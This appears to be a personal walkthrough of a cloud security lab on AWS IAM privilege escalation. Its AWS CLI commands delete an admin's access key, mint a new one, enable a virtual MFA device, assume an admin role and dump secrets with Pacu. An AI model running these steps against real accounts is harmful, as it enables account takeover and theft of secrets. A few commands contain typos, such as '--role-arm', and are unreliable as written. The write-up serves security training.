----------------

### IAM privesc by key_rotation

----------------

- Check policies-:

<img width="1230" height="178" alt="image" src="https://github.com/user-attachments/assets/4592a883-4aaf-4be0-8ff4-a1e98c22fbb5" />

<img width="1294" height="527" alt="image" src="https://github.com/user-attachments/assets/5883fb3b-5691-453e-83aa-6dfc6e6ab92a" />

- If a user can add tags to a user, you can add administrative acccess to a user.e.g

```bash
aws iam tag-user --user-name <username> --tags '{"Key": "developer", "Value": "true"}' --profile key_rotation | jq
```

- Deleting access keys requires `listing the access key id` like this-:

```bash
aws iam list-access-keys --user-name <username> --profile key_rotation | jq
```

<img width="1128" height="366" alt="image" src="https://github.com/user-attachments/assets/3794fdeb-7eb0-4a0e-8944-a0b699e5e917" />

- Finally deleting it-:

```bash
aws iam delete-access-key --user-name admin_ --access-key-id AKIA4TCVBDXKSZGBT75K --profile key_rotation | jq
```
- Creating a new  access-key-:

```bash
aws iam create-access-key --user-name <admin> --profile key_rotation | jq
```

- We need a `MFA-virtual-device` for user `admin_*` to assume role `secretsmanager`.

<img width="813" height="521" alt="image" src="https://github.com/user-attachments/assets/04e375f7-86f8-43c0-83ea-a4674737f927" />

- Creating an MFA virtual device-:

```bash
aws iam create-virtual-mfa-device --virtual-mfa-device-name mfaDevice --outfile /home/sensei/cloud/iam_key_rotation/iam.png --bootstrap-method QRCodePNG | jq
```

<img width="790" height="125" alt="image" src="https://github.com/user-attachments/assets/7d1bb2d2-344d-40d1-841f-fe19110c70a0" />

- Showing already created mfa device-:

```bash
aws iam list-virtual-mfa-devices --profile admin_key_rotation | jq 
```

<img width="797" height="175" alt="image" src="https://github.com/user-attachments/assets/ad1072fa-21a4-4e36-81e0-744f3b869f21" />

- Scan the already created png file with an authenticator app e.g `Authy` or `Google Authenticator`.Then, the first code is the first code you see and the second code is the code generated after the first.

```bash
aws iam enable-mfa-device \
    --user-name TargetIAMUserName \
    --serial-number arn:aws:iam::123456789012:mfa/MyUserMFADevice \
    --authentication-code-1 <first one> \
    --authentication-code-2 <second code>
```

- Assuming role with an MFA device-:

```bash
aws sts assume-role \
  --role-arm "arn:aws:iam::123456789012:role/YourAdminRoleName" \
  --role-session-name "MFA-Admin-Session" \
  --serial-number "arn:aws:iam::123456789012:mfa/your-username" \
  --token-code <from authenticator>
```
<img width="1897" height="372" alt="image" src="https://github.com/user-attachments/assets/c0c5a1a6-d1f5-451c-8512-3ba056f00744" />

- Switching to Pacu-:

```
#configure the temp_keys with
set_keys
#run module
run enum__secrets --region us-east-1
```

<img width="1077" height="360" alt="image" src="https://github.com/user-attachments/assets/fdf24254-5bb4-4e0b-a95e-b61a7154eb82" />

- Secretss-:

<img width="1415" height="91" alt="image" src="https://github.com/user-attachments/assets/8c85745f-53d6-4f9f-8438-f5ebb22e031b" />


-----------------
